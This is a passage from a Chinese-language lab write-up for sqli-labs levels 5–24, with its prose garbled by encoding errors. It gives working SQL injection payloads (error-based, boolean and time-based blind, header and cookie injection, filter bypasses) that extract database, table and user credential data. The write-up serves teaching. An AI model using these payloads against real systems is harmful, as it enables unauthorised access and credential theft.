text"><br>æˆ‘ä»¬å‘ç°æœ‰æŠ¥é”™é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥å…¶å®ä¹Ÿå¯ä»¥åˆ©ç”¨åœ¨å‰å››é¢˜ï¼Œä½†æ˜¯å› ä¸ºå‰å››é¢˜æœ‰æ­£å¸¸çš„å›æ˜¾ä½æ‰€ä»¥é‡‡ç”¨è”åˆæ³¨å…¥æ˜¯æ›´å¥½çš„ï¼Œä½†æ˜¯è¿™é¢˜å¹¶æ²¡æœ‰æ­£å¸¸çš„å›æ˜¾ä½æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨æŠ¥é”™æ³¨å…¥<br>æˆ‘ä»¬æŸ¥çœ‹ä¸Šé¢çš„æŠ¥é”™å‘ç°è¿™é¢˜çš„é—­åˆæ–¹å¼åº”ä¸º<code>&#39;</code><br>éšåæŸ¥è¯¢åˆ—æ•°<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3--+</span><br></pre></td></tr></table></figure><br>æŸ¥è¯¢åˆ°åˆ—æ•°ä¸º3<br>éšåæˆ‘ä»¬è¿›è¡ŒæŠ¥é”™æ³¨å…¥æˆ‘ä»¬è¦ç”¨åˆ°extractvalue()æ³¨å…¥<br>extarctvalue()æ˜¯ä¸€ä¸ªè¾“å…¥ä¸¤å€¼çš„å‡½æ•°ç¬¬ä¸€ä¸ªå‡½æ•°ä¸ºæ–‡ä»¶åç¬¬äºŒä¸ªä¸ºæ–‡ä»¶åœ¨æ–‡ä»¶å¤¹çš„åœ°å€æ–‡ä»¶çš„åœ°å€æ˜¯ä»¥<code>/</code>å¼€å¤´çš„æˆ‘ä»¬å¯ä»¥å°†/æ¢æˆ<code>~</code>ä½¿å‡½æ•°æŠ¥é”™åœ¨å°†~åçš„æ›¿æ¢ä¸ºæŸ¥è¯¢è¯­å¥ï¼Œè¿™æ ·å°±ä¼šæŠ¥é”™å‡ºæˆ‘ä»¬æŸ¥è¯¢çš„å†…å®¹ä¸‹é¢æ˜¯æ³¨å…¥ä»£ç <br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select database())))--+</span><br></pre></td></tr></table></figure><br>æŸ¥è¯¢åˆ°æŠ¥é”™ä¸º<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/sqli-labs_less5_3.png" class="" title="Alt text"><br>æŠ¥é”™å‡ºæ•°æ®åº“åä¸º<code>security</code><br>ä¹‹ååœ¨æŸ¥è¯¢æ‰€æœ‰çš„åº“å<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)))--+</span><br></pre></td></tr></table></figure><br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less5-4.png" class="" title="Alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æŠ¥é”™çš„å­—ç¬¦æ•°æ²¡æœ‰è¾“å‡ºæ‰€æœ‰çš„æ•°æ®åº“ï¼ŒåŸå› æ˜¯å› ä¸ºæŠ¥é”™æ³¨å…¥æœ€å¤šè¾“å‡º30ä¸ªå­—ç¬¦ï¼Œè¿™æ—¶æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°ä¸€ä¸ªæ§åˆ¶è¾“å‡ºå­—ç¬¦çš„å‡½æ•°<code>substring()</code><br>substring()æœ‰ä¸‰ä¸ªå‚æ•°ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªè¡¨ç¤ºä»ç¬¬å‡ ä½è¾“å‡ºï¼Œç¬¬ä¸‰ä¸ªä»£è¡¨è¾“å‡ºä¸ªæ•°<br>å¤§è‡´å¦‚ä¸‹<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">substring</span>((string),<span class="number">1</span>,<span class="number">30</span>) <span class="operator">/</span><span class="operator">/</span>stringä»£è¡¨å­—ç¬¦ä¸²ï¼Œè¯¥ä»£ç è¡¨ç¤ºä»ç¬¬<span class="number">1</span>ä½è¾“å‡º<span class="number">30</span>ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><br>åŠ å…¥åæ³¨å…¥è¯­å¥å¦‚ä¸‹<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(schema_name) from information_schema.schemata),1,30)))</span></span><br></pre></td></tr></table></figure><br>ä¸æ–­è°ƒæ•´è¾“å‡ºçš„èŒƒå›´å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„æ•°æ®åº“å<br>ä¹‹åå°±æ ‡å‡†çš„çˆ†è¡¨åçˆ†åˆ—åæŸ¥çœ‹æ•°æ®äº†<br>çˆ†è¡¨å<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),1,30)))--+</span></span><br></pre></td></tr></table></figure><br>çˆ†åˆ—å<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,30)))--+</span><br></pre></td></tr></table></figure><br>æŸ¥è¯¢æ•°æ®<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(password,username) from security.users),31,30)))--+</span><br></pre></td></tr></table></figure><br>è€Œless6ä¹Ÿå¤§åŒå°å¼‚åªè¦å°†?id=1â€™çš„å•å¼•å·æ”¹ä¸ºåŒå¼•å·</p><h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><h2 id="less8-sqlå¸ƒå°”ç›²æ³¨"><a href="#less8-sqlå¸ƒå°”ç›²æ³¨" class="headerlink" title="less8 sqlå¸ƒå°”ç›²æ³¨"></a>less8 sqlå¸ƒå°”ç›²æ³¨</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">length(str):è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦</span><br><span class="line">substr(str,pos,len)</span><br><span class="line">ascii(str)ï¼šè¿”å›å­—ç¬¦ä¸²æœ€å·¦è¾¹çš„å­—ç¬¦çš„asciiç å€¼</span><br><span class="line">ord(str)ï¼šåŒä¸Š</span><br><span class="line">if(a,b,c)ï¼šå¦‚æœaä¸ºçœŸæ‰§è¡Œbå‡æ‰§è¡Œc</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¾“å…¥id=1é¡µé¢å›æ˜¾you are in è¾“å…¥id=1â€™ä¸å›æ˜¾è¾“å…¥id=1â€™â€”+é¡µé¢å›æ˜¾è¯æ˜è¯¥é¢˜ä¸ºå­—ç¬¦å‹â€™é—­åˆ<br>æˆ‘ä»¬è¾“å…¥ä»¥ä¸‹ä»£ç <br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select database()))&gt;=1--+</span><br></pre></td></tr></table></figure><br>lengthå‡½æ•°å›è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦æˆ‘ä»¬å¯ä»¥é€šè¿‡äºŒåˆ†æ³•æ¯”è¾ƒæ¥æ‰¾å‡ºæŸ¥è¯¢åˆ°çš„å­—ç¬¦ä¸²é•¿åº¦<br>åœ¨åˆ©ç”¨ascii()å’Œsubstr()æ¥è¿›è¡Œæ„é€ æ³¨å…¥å¦‚ä¸‹çš„è¯­å¥<br>(ç”±äºæŸ¥è¯¢è¯­å¥ç”±å¤šä¸ªå­—ç¬¦ä¸²æ„æˆæ‰€æœ‰æˆ‘ä»¬éœ€è¦å°†æŸ¥è¯¢è¯­å¥ï¼ˆï¼‰èµ·æ¥)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;100--+</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯é€šè¿‡äºŒåˆ†å‘è¿›è¡Œæ¯”è¾ƒå…¶asciiç å€¼æ¥å¯¹å…¶å­—ç¬¦è¿›è¡Œç¡®è®¤<br>ä¹‹åä¹Ÿä¸€æ ·æˆ‘ä»¬åªè¦å¯¹å…¶çš„æŸ¥è¯¢è¯­å¥è¿›è¡Œä¿®æ”¹å°±å¯ä»¥äº†<br>å¯ä»¥å°†<code>select database()</code>è¿›è¡Œæ›´æ”¹å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select group_concat(table_name) from information_schema.schemata),1,1))&gt;=5</span><br></pre></td></tr></table></figure></p><p>less9 æ—¶é—´ç›²æ³¨<br>æˆ‘ä»¬è¾“å…¥?id=1è¿”å›you are inå†è¾“å…¥?id=1â€™è¿”å›ç›¸åŒå€¼å†è¾“å…¥id=1â€ä¸€æ ·é‚£ä¹ˆè¿™é¢˜æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°æ—¶é—´ç›²æ³¨<br>æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹sleep()å‡½æ•°è¯¥å‡½æ•°æ‰§è¡Œåé‚£ä¹ˆç½‘é¡µå°±ä¼šå»¶è¿Ÿæ•°ç§’å“åº”å¦‚<code>sleep(3)</code>é‚£ä¹ˆå°±ä¼šå»¶è¿Ÿ3ç§’é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹ä»£ç è¿›è¡ŒæŸ¥çœ‹ä¸ºä»€ä¹ˆé—­åˆæ–¹å¼<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(3)--+</span><br></pre></td></tr></table></figure><br>å‘ç°ç½‘é¡µå»¶è¿Ÿ3ç§’æ‰å“åº”é‚£ä¹ˆè¯¥é¢˜åº”è¯¥å°±ä¸ºå•å¼•å·é—­åˆ<br>æˆ‘ä»¬å†åˆ©ç”¨ifå¯¹æ³¨å…¥è¯­å¥è¿›è¡Œç¼–è¾‘<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select database()),1,1))&gt;10,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><br>åŒç†æˆ‘ä»¬åªè¦å¯¹ifé‡Œçš„æŸ¥è¯¢è¯­å¥è¿›è¡Œæ›¿æ¢å°±å¯</p><h1 id="less10-æ—¶é—´ç›²æ³¨"><a href="#less10-æ—¶é—´ç›²æ³¨" class="headerlink" title="less10 æ—¶é—´ç›²æ³¨"></a>less10 æ—¶é—´ç›²æ³¨</h1><p>åŒæ ·çš„è¿™é¢˜ä¸ºæ—¶é—´ç›²æ³¨<br>å°è¯•å‡ºé—­åˆæ–¹å¼<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and sleep(3)</span><br></pre></td></tr></table></figure><br>åˆ©ç”¨ä¸‹é¢çš„è¯­å¥å°è¯•å‡ºæ•°æ®åº“åç§°<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3))</span><br></pre></td></tr></table></figure><br>ä¹‹åå°±æ˜¯æ›¿æ¢æŸ¥è¯¢è¯­å¥è¿›è¡Œçˆ†åº“åï¼Œè¡¨ååˆ—åï¼ŒæŸ¥æ•°æ®</p><h1 id="less11-postæ³¨å…¥çš„unionæ³¨å…¥"><a href="#less11-postæ³¨å…¥çš„unionæ³¨å…¥" class="headerlink" title="less11 postæ³¨å…¥çš„unionæ³¨å…¥"></a>less11 postæ³¨å…¥çš„unionæ³¨å…¥</h1><p>è¿™é¢˜ç›®æˆ‘ä»¬å¯ä»¥å‘ç°æœ‰ç‚¹ä¸åŒï¼Œå®ƒæ˜¯åœ¨ç™»é™†ç•Œé¢è¿›è¡Œæ³¨å…¥çš„ï¼Œä¹Ÿå°±æ˜¯ä»–çš„sqlè¯­å¥ç”±postè¡¨è¾¾æäº¤<br>æˆ‘ä»¬å®Œå…¨å¯ä»¥çŒœæµ‹å…¶sqlè¯­å¥åº”ä¸º<br>username=ä¼ é€’å‚æ•° and password=ä¼ é€’å‚æ•°<br> å…¶ä»–çš„å…¶å®ä¸åœ¨urlä¸Šçš„æ³¨å…¥å·®å¼‚ä¸å¤§æ³¨å…¥åªæ˜¯å°†æ³¨é‡Šç¬¦â€”+æ”¹ä¸º#è¯­å¥å¦‚ä¸‹<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,database()#</span><br><span class="line">1&#x27; union select 1,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line">1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27;#</span><br><span class="line">1&#x27; union select 1,group_concat(email_id) from security.emails#</span><br></pre></td></tr></table></figure></p><h1 id="less12-postçš„unionæ³¨å…¥"><a href="#less12-postçš„unionæ³¨å…¥" class="headerlink" title="less12 postçš„unionæ³¨å…¥"></a>less12 postçš„unionæ³¨å…¥</h1><p>ä¸ç¬¬11å…³åŸºæœ¬ä¸€æ ·åªæ˜¯é—­åˆæ–¹å¼ä¸º1â€)</p><h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>æˆ‘ä»¬è¾“å…¥1â€™) union select 1,2#å±å¹•æ²¡æœ‰å›æ˜¾æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨æŠ¥é”™æ³¨å…¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and extractvalue(1,concat(0x7e,substr((select database()),1,28)))#</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥å¯¹æŸ¥è¯¢è¯­å¥è¿›è¡Œæ›¿æ¢</p><h1 id="less-14-postçš„unionæ³¨å…¥"><a href="#less-14-postçš„unionæ³¨å…¥" class="headerlink" title="less 14 postçš„unionæ³¨å…¥"></a>less 14 postçš„unionæ³¨å…¥</h1><p>ä¸13é¢˜ç›¸ä¼¼åªæ˜¯ç”±â€™)æ”¹ä¸ºâ€</p><h1 id="less-15-postçš„æ—¶é—´ç›²æ³¨"><a href="#less-15-postçš„æ—¶é—´ç›²æ³¨" class="headerlink" title="less 15 postçš„æ—¶é—´ç›²æ³¨"></a>less 15 postçš„æ—¶é—´ç›²æ³¨</h1><p>è¯¥é¢˜ç›®æˆ‘ä»¬å‘ç°ä¸ç®¡æ€ä¹ˆè¾“å…¥éƒ½ä¸å›æ˜¾æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨æ—¶é—´ç›²æ³¨</p><h1 id="less-16-postçš„æ—¶é—´ç›²æ³¨"><a href="#less-16-postçš„æ—¶é—´ç›²æ³¨" class="headerlink" title="less 16 postçš„æ—¶é—´ç›²æ³¨"></a>less 16 postçš„æ—¶é—´ç›²æ³¨</h1><p>ä¸15ç›¸ä¼¼</p><h1 id="less-17-postçš„æ—¶é—´ç›²æ³¨"><a href="#less-17-postçš„æ—¶é—´ç›²æ³¨" class="headerlink" title="less 17 postçš„æ—¶é—´ç›²æ³¨"></a>less 17 postçš„æ—¶é—´ç›²æ³¨</h1><p>ç›¸åŒ</p><h1 id="less-18-uaå¤´æ³¨å…¥"><a href="#less-18-uaå¤´æ³¨å…¥" class="headerlink" title="less 18 uaå¤´æ³¨å…¥"></a>less 18 uaå¤´æ³¨å…¥</h1><p>æˆ‘ä»¬å¯ä»¥ä»less18çš„æºä»£ç å…¥æ‰‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br></pre></td></tr></table></figure><br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less18-1.png" class="" title="Alt text"><br>è¯¥å›¾ä¸­æ˜¾ç¤ºä¼šå°†uagentçš„å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œè€Œuagentçš„å†…å®¹ä¸ºæ ‡å¤´ user_agentçš„å†…å®¹é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨bpæ¥æŠ“åŒ…ä¿®æ”¹uaå¤´çš„å†…å®¹ï¼ˆå‘é€åˆ°é‡æ”¾å™¨ä»¥ä¾¿ä¿®æ”¹uaå¤´ï¼‰<br>å¯¹uaå¤´è¿›è¡Œä¿®æ”¹é‡‡ç”¨æŠ¥é”™æ³¨å…¥ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select database())),3),2,3)#</span><br></pre></td></tr></table></figure><br><figure class="highlight sql"><figcaption><span>æ’å…¥è¯­å¥</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">VALUES</span>(<span class="string">&#x27;$uagent&#x27;</span>,<span class="string">&#x27;$ip&#x27;</span>,<span class="string">&#x27;$uname&#x27;</span>)</span><br></pre></td></tr></table></figure><br>ç»“åˆæ’å…¥è¯­å¥æˆ‘ä»¬è¿›è¡Œè¯­å¥çš„åˆ†æï¼Œ<code>&#39;</code>æ˜¯ä¸ºäº†é—­åˆâ€™$uagentâ€™çš„â€™,oræˆ–æ˜¯ä¸€ä¸ªæŠ¥é”™æ³¨å…¥ï¼Œæ’å…¥çš„sqlæ³¨å…¥ä¸€èˆ¬éƒ½ä½¿ç”¨æŠ¥é”™æ³¨å…¥ç»“å°¾çš„<code>2,3</code>æ˜¯è¾“å…¥çš„ipä»¥åŠuname<code>)</code>ç»“å°¾çš„æ‹¬å·æ˜¯ä¸ºäº†é—­åˆæ‹¬å·#æ˜¯ä¸ºäº†æ³¨é‡Šæ‰åé¢çš„<code>&#39;,&#39;$ip&#39;,&#39;$uname&#39;)</code></p><h1 id="less19-refereræ³¨å…¥"><a href="#less19-refereræ³¨å…¥" class="headerlink" title="less19 refereræ³¨å…¥"></a>less19 refereræ³¨å…¥</h1><p>è¯¥é¢˜ç›®æˆ‘ä»¬åœ¨ç™»é™†å£è¾“å…¥adminï¼Œadminè¿™æ—¶å€™å±å¹•å›æ˜¾å‡ºrefererçš„å†…å®¹æˆ‘ä»¬å¯ä»¥çŒœæµ‹æ˜¯refereræ³¨å…¥<br>æˆ‘ä»¬æ‰“å¼€ç½‘é¡µä»£ç æŸ¥çœ‹ä¸€ä¸‹<br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less19-1.png" class="" title="Alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°åªè¦è´¦å·å¯†ç è¾“å…¥æ­£ç¡®é‚£ä¹ˆå°±ä¼šå¯¹æ•°æ®åº“securityçš„refererè¡¨ä¸­çš„refererå’Œip_addressæ•°æ®åˆ—é‡Œæ’å…¥<code>$uagent</code>å’Œ<code>$ip</code>è¿™ä¸¤ä¸ªæ•°æ®ï¼Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br></pre></td></tr></table></figure><br>è€Œæ ¹æ®è¿™ä¸ªä»£ç å‘ç°$uagenté‡Œå­˜çš„æ˜¯refererçš„å†…å®¹é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•æŠ“åŒ…ä¿®æ”¹refererå¤´çš„å†…å®¹è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä»£ç å¦‚ä¸‹<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select database())),3),2)#</span></span><br></pre></td></tr></table></figure><br>è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥çˆ†å‡ºå…¶æ•°æ®åº“åç§°ï¼Œä¹‹åæˆ‘ä»¬å¯ä»¥å¯¹æŠ¥é”™æ³¨å…¥çš„æŸ¥è¯¢è¯­å¥è¿›è¡Œä¿®æ”¹å°±å¯ä»¥æŸ¥è¯¢å…¶ä»–è¯­å¥</p><h1 id="less20-cookieæ³¨å…¥"><a href="#less20-cookieæ³¨å…¥" class="headerlink" title="less20 cookieæ³¨å…¥"></a>less20 cookieæ³¨å…¥</h1><p>è¯¥é¢˜ç›®æˆ‘ä»¬è¾“å…¥adminå’Œadminå±å¹•å›æ˜¾,cookieçš„å€¼ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºä»£ç <br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less20-1.png" class="" title="Alt text"><br><img src="/2023/11/16/sqli-labs%E7%9A%84wp/less20-2.png" class="" title="Alt text"><br>è¿™ä¸¤ä¸ªå›¾ç‰‡çš„ä»£ç è¡¨ç¤ºä¼šå›æ˜¾cookieçš„å€¼å’Œä¼šæŸ¥è¯¢åœ¨æŸ¥è¯¢è¯­å¥ä¸­æŸ¥è¯¢cookieè¿™æ—¶æˆ‘ä»¬åªè¦å¯¹cookieè¿›è¡Œä¿®æ”¹å°†å…¶ä¿®æ”¹ä¸ºæŸ¥è¯¢è¯­å¥é‚£ä¹ˆå°±ä¼šå›æ˜¾å‡ºcookieçš„å€¼å°±ä¼šä¸ºæŸ¥è¯¢è¯­å¥çš„ç»“æœ<br>ç”±äºè¯¥è¯­å¥æ˜¯ç›´æ¥æŸ¥è¯¢cookieæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨unionæ³¨å…¥ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; union select 1,2,database()#</span><br></pre></td></tr></table></figure><br>å‰©ä¸‹çš„åŒæ ·å¯¹æŸ¥è¯¢è¯­å¥æ›¿æ¢å³å¯</p><h1 id="less21-cookieæ³¨å…¥base64ç¼–ç "><a href="#less21-cookieæ³¨å…¥base64ç¼–ç " class="headerlink" title="less21 cookieæ³¨å…¥base64ç¼–ç "></a>less21 cookieæ³¨å…¥base64ç¼–ç </h1><p>21å…³åŒæ ·æ˜¯cookieæ³¨å…¥<br>æˆ‘ä»¬è¿›è¡ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°å…¶cookieå€¼æ˜¯ä¸€ä¸²ä»£ç æˆ‘ä»¬åœ¨bpä¸­å¯ä»¥çœ‹å‡ºå…¶ä¸ºbase64ç¼–ç é‚£ä¹ˆæˆ‘ä»¬åªè¦å°†æ³¨å…¥è¯­å¥é€šè¿‡base64ç¼–ç åå†è¾“å…¥å³å¯</p><h1 id="less22-cookieæ³¨å…¥base64ç¼–ç "><a href="#less22-cookieæ³¨å…¥base64ç¼–ç " class="headerlink" title="less22 cookieæ³¨å…¥base64ç¼–ç "></a>less22 cookieæ³¨å…¥base64ç¼–ç </h1><p>ä¸21ç›¸ä¼¼å°±æ˜¯é—­åˆæ–¹å¼ä¸åŒ</p><h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><h2 id="æ–¹æ³•1ï¼šæ³¨é‡Šç¬¦-39-ç»•è¿‡"><a href="#æ–¹æ³•1ï¼šæ³¨é‡Šç¬¦-39-ç»•è¿‡" class="headerlink" title="æ–¹æ³•1ï¼šæ³¨é‡Šç¬¦&#39;ç»•è¿‡"></a>æ–¹æ³•1ï¼šæ³¨é‡Šç¬¦<code>&#39;</code>ç»•è¿‡</h2><p>è¿™ä¸€å…³æˆ‘ä»¬å‘ç°ä¸ç¬¬ä¸€ä¸ªéå¸¸ç›¸ä¼¼æˆ‘ä»¬ç›´æ¥è¾“å…¥<code>?id=1</code>å±å¹•å›æ˜¾æˆ‘ä»¬å†æ³¨å…¥<code>?id=1&#39;</code>æŠ¥é”™æˆ‘ä»¬å‘ç°æ˜¯<code>&#39;</code>é—­åˆæˆ‘ä»¬å†è¾“å…¥<code>?id=1&#39;--+</code>ä»ç„¶æŠ¥é”™æˆ‘ä»¬è¾“å…¥<code>?id=1&#39;#</code>ä¹Ÿç›¸åŒ<br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‘ç°å…¶æ³¨é‡Šç¬¦è¢«è¿‡æ»¤äº†æˆ‘ä»¬å¯ä»¥é‡‡ç”¨<code>&#39;</code>ç»•è¿‡ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3&#x27;</span><br></pre></td></tr></table></figure><br>æ³¨å…¥è¯­å¥ç»“å°¾çš„â€™ä¸åŸæœ¬çš„â€™é—­åˆä½¿sqlè¯­å¥æ­£å¸¸è¿™å°±ç»•è¿‡äº†æ³¨é‡Šç¬¦è¿‡æ»¤<br>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3,4 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><br>è¯¥ç»•è¿‡æ–¹å¼åˆ©ç”¨äº†<code>or &#39;1&#39;=&#39;1</code>æ¥é—­åˆ<code>&#39;</code><br><strong>æ³¨æ„è¯¥ç»•è¿‡è¯­å¥å¯¼è‡´order byä¸å¯ä»¥ä½¿ç”¨åªèƒ½åˆ©ç”¨union select 1ï¼Œ2ï¼Œ3ï¼Œ4é€šè¿‡åˆ å‡æ•°å­æ¥å¯»æ‰¾åˆ—æ•°</strong><br>ç»•è¿‡äº†æ³¨é‡Šç¬¦æ—¶å°±å¯ä»¥åˆ©ç”¨è”åˆæ³¨å…¥äº†</p><h2 id="æ–¹æ³•2ï¼šæ³¨é‡Šç¬¦åˆ©ç”¨-00æ¥ç»•è¿‡"><a href="#æ–¹æ³•2ï¼šæ³¨é‡Šç¬¦åˆ©ç”¨-00æ¥ç»•è¿‡" class="headerlink" title="æ–¹æ³•2ï¼šæ³¨é‡Šç¬¦åˆ©ç”¨%00æ¥ç»•è¿‡"></a>æ–¹æ³•2ï¼šæ³¨é‡Šç¬¦åˆ©ç”¨%00æ¥ç»•è¿‡</h2><p>%00æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ï¼Œåœ¨16è¿›åˆ¶ä¸­è¡¨ç¤ºä¸º0x00ï¼Œå³asciiç å€¼ä¸º0ï¼Œå¾ˆå¤šå‡½æ•°åœ¨è¯»å–åˆ°0x00æ—¶å°±ä¼šåœæ­¢åœ¨ç³»ç»Ÿä¸­è¯»å–æ–‡ä»¶åæ—¶å¦‚æœé‡åˆ°å°±ä¼šåœæ­¢ï¼Œæˆ‘ä»¬å¯ä»¥è¿ç”¨è¿™ä¸ªæ€§è´¨æ¥ç»•è¿‡ä¸€äº›æ–‡ä»¶ä¸Šä¼ ï¼Œ<br>%00ä¹Ÿå¯ä»¥åœ¨sqlè¯­å¥å°¾éƒ¨ä½œä¸ºæˆªæ–­å› ä¸ºåœ¨æœåŠ¡å™¨ä¸­%00è¢«è§£æä¸º0x00è¿™å¯¼è‡´äº†åé¢çš„è¯­å¥è¢«æˆªæ–­ï¼Œæ³¨æ„å› ä¸ºæ˜¯æˆªæ–­æ‰€æœ‰æˆ‘ä»¬éœ€è¦åœ¨å¥å°¾å†™ä¸‹åˆ†å·</p><h1 id="less-24"><a href="#less-24" class="headerlink" title="less 24"></a>less 24</h1><p>è¿™é“é¢˜ç›®æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ç™»é™†ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç›´æ¥çœ‹åç«¯æºä»£ç æ¥è¿›è¡Œåˆ†æ<br><img 